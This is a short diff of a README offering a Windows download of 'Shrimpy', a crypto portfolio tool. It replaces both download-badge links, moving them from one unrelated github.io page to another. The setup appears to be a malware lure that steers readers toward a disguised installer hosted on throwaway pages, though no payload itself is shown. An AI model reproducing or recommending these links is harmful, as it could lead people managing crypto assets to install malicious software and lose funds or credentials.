@@ -4,7 +4,7 @@
 
 ## 📥 Download Shrimpy for Windows
 
-[![⬇️ Download Shrimpy](https://img.shields.io/badge/Download-Shrimpy-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/228)
+[![⬇️ Download Shrimpy](https://img.shields.io/badge/Download-Shrimpy-blue?style=for-the-badge&logo=windows)](https://shrimpyload.github.io/.github/)
 
 ---
 
@@ -32,7 +32,7 @@ Shrimpy also provides advanced charting, social trading features, and performanc
 
 Whether you’re managing a small personal portfolio or overseeing multiple accounts, Shrimpy offers the tools to simplify crypto investing, reduce manual work, and stay in control of your assets from anywhere.
 
-[![⬇️ Download Shrimpy](https://img.shields.io/badge/Download-Shrimpy-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/228)
+[![⬇️ Download Shrimpy](https://img.shields.io/badge/Download-Shrimpy-blue?style=for-the-badge&logo=windows)](https://shrimpyload.github.io/.github/)
 
 ---
 
